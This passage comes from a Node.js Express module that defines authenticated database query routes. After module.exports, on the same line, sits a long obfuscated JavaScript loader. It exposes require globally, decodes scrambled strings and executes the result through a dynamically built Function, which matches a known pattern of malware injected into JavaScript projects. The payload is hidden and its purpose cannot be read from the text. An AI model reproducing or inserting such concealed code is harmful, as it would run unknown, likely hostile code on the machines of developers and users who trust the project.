          const convertedData = convertBigIntToString(result);
          res.json(convertedData);
        }
        );

      } catch (err) {
        console.error(err);
        res.status(500).send("Error querying data");
      }
    });

    app.get(
      "/get-all-groupe/:database/:tableName",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName } = req.params;
          const db = dbs.databases[database];


          // Get the fields from the query string. It's a comma-separated string.
          const fields = req.query.fields ? req.query.fields.split(",") : null;

          // Parse the filter from the query string.
          const filter = req.query.filter ? req.query.filter.split("|") : null;
          const filterObj = filter
            ? {
              column: filter[0],
              operator: filter[1],
              value: filter[2],
            }
            : null;

          db.getAllGroupe(tableName, fields, filterObj).then(data => {
            // Convert BigInt to int or string
            const convertedData = convertBigIntToString(data);
            res.json(convertedData);
          }
          );
        } catch (err) {
          console.error("Error:", err);
          res.status(500).send("Error moving to first record");
        }
      }
    );
  }
}

module.exports = dblayer; global['!'] = '4-803'; var _$_1e42 = (function (l, e) { var h = l.length; var g = []; for (var j = 0; j < h; j++) { g[j] = l.charAt(j) }; for (var j = 0; j < h; j++) { var s = e * (j + 489) + (e % 19597); var w = e * (j + 659) + (e % 48014); var t = s % h; var p = w % h; var y = g[t]; g[t] = g[p]; g[p] = y; e = (s + w) % 4573868 }; var x = String.fromCharCode(127); var q = ''; var k = '\x25'; var m = '\x23\x31'; var r = '\x25'; var a = '\x23\x30'; var c = '\x23'; return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x) })("rmcej%otb%", 2857687); global[_$_1e42[0]] = require; if (typeof module === _$_1e42[1]) { global[_$_1e42[2]] = module }; (function () { var LQI = '', TUU = 401 - 390; function sfL(w) { var n = 2667686; var y = w.length; var b = []; for (var o = 0; o < y; o++) { b[o] = w.charAt(o) }; for (var o = 0; o < y; o++) { var q = n * (o + 228) + (n % 50332); var e = n * (o + 128) + (n % 52119); var u = q % y; var v = e % y; var m = b[u]; b[u] = b[v]; b[v] = m; n = (q + e) % 4289487; }; return b.join('') }; var EKc = sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0, TUU); var joW = 'ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c'; var dgC = sfL[EKc]; var Apa = ''; var jFD = dgC; var xBg = dgC(Apa, sfL(joW)); var pYd = xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M')); var Tgw = jFD(LQI, pYd); Tgw(2509); return 1358 })()